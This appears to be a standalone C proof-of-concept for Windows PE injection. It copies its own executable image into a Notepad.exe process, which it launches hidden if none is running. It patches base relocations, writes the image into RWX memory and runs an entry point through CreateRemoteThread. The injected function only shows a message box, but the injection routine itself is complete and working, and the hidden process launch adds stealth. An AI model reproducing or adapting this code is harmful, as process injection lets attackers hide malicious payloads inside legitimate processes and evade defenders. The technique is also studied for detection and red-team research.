#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

DWORD InjectionEntryPoint(LPVOID lpParameter) {
    CHAR moduleName[128] = "";
    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
    MessageBoxA(NULL, moduleName, "Obligatory PE Injection", MB_OK);
    return 0;
}

DWORD InjectionEntryPoint1(LPVOID lpParameter) {
    CHAR moduleName[128] = "";
    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
    MessageBoxA(NULL, moduleName, "Obligatory PE Injection 1", MB_OK);
    return 0;
}

// Function to get the PID of a process by its name
DWORD get_pid_by_name(const char *proc_name) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap;
    DWORD pid = 0;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "CreateToolhelp32Snapshot failed, error: %ld\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        fprintf(stderr, "Process32First failed, error: %ld\n", GetLastError());
        CloseHandle(hProcessSnap);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, proc_name) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return pid;
}

// Function to launch a process in a hidden state
void LaunchHiddenProcess(const char *processName) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, (LPSTR)processName, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "CreateProcess failed, error: %lu\n", GetLastError());
    } else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}




int main() {

    MessageBoxA(NULL, "Go to entry", "Hehe", MB_OK);
    PVOID imageBase = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

    PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

    DWORD pid = get_pid_by_name("Notepad.exe");

    if (pid == 0) {
        LaunchHiddenProcess("Notepad.exe");
        Sleep(5000);
        pid = get_pid_by_name("Notepad.exe");
    }
    if (pid == 0)
        return 0;

    HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
    PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

    printf("Start Relo!\n");
    int i = 1;
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    while (relocationTable->SizeOfBlock > 0) {
        DWORD relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        PBASE_RELOCATION_ENTRY relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
        printf("Relo Block: %d\n", i);
        i++;
        for (DWORD j = 0; j < relocationEntriesCount; j++) {
            if (relocationRVA[j].Offset) {
                PDWORD_PTR originalAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[j].Offset);
                PDWORD_PTR patchedAddress = originalAddress;
                printf("Original Address: %p -> ", (void*)*patchedAddress);
                *patchedAddress += deltaImageBase;
                printf("Patched Address: %p\n", (void*)*patchedAddress);
            }
        }
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }
    if (!WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL)) {
        VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
        CloseHandle(targetProcess);
        VirtualFree(localImage, 0, MEM_RELEASE);
        return 1;
    }

    printf("%lx\n", (DWORD_PTR)InjectionEntryPoint - (DWORD_PTR)imageBase);
    printf("%lx\n", (DWORD_PTR)InjectionEntryPoint1 - (DWORD_PTR)imageBase);
    DWORD_PTR injectionEntryPointAddress = (DWORD_PTR)InjectionEntryPoint1 + deltaImageBase;
    HANDLE remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)injectionEntryPointAddress, NULL, 0, NULL);
    if (remoteThread == NULL) {
        VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
        CloseHandle(targetProcess);
        VirtualFree(localImage, 0, MEM_RELEASE);
        return 1;
    }

    WaitForSingleObject(remoteThread, INFINITE);
    //Sleep(5000);


    CloseHandle(remoteThread);
    VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
    CloseHandle(targetProcess);
    VirtualFree(localImage, 0, MEM_RELEASE);

    while (1) {
    // Do nothing, just loop infinitely
    }
    return 0;
}
